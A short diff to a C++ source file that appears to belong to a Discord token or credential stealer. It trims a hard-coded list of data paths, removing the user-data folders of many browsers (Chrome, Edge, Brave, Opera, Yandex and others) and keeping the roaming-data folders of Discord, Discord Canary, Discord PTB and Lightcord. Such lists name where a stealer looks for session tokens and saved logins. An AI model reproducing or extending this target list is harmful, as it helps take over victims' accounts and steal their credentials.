@@ -29,24 +29,7 @@ private:
         Utils::getRoamingPath() / "discord",
         Utils::getRoamingPath() / "discordcanary",
         Utils::getRoamingPath() / "Lightcord",
-        Utils::getRoamingPath() / "discordptb",
-        Utils::getRoamingPath() / "Opera Software"       / "Opera Stable",
-        Utils::getLocalPath()   / "Amigo"                / "User Data",
-        Utils::getLocalPath()   / "Torch"                / "User Data",
-        Utils::getLocalPath()   / "Kometa"               / "User Data",
-        Utils::getLocalPath()   / "Orbitum"              / "User Data",
-        Utils::getLocalPath()   / "Epic Privacy Browser" / "User Data",
-        Utils::getLocalPath()   / "CentBrowser"          / "User Data",
-        Utils::getLocalPath()   / "Vivaldi"              / "User Data"     / "Default",
-        Utils::getLocalPath()   / "Iridium"              / "User Data"     / "Default",
-        Utils::getLocalPath()   / "7Star"                / "7Star"         / "User Data",
-        Utils::getLocalPath()   / "Sputnik"              / "Sputnik"       / "User Data",
-        Utils::getLocalPath()   / "Google"               / "Chrome SxS"    / "User Data",
-        Utils::getLocalPath()   / "Google"               / "Chrome"        / "User Data" / "Default",
-        Utils::getLocalPath()   / "Microsoft"            / "Edge"          / "User Data" / "Default",
-        Utils::getLocalPath()   / "uCozMedia"            / "Uran"          / "User Data" / "Default",
-        Utils::getLocalPath()   / "Yandex"               / "YandexBrowser" / "User Data" / "Default",
-        Utils::getLocalPath()   / "BraveSoftware"        / "Brave-Browser" / "User Data" / "Default"
+        Utils::getRoamingPath() / "discordptb"
     };
 };
 
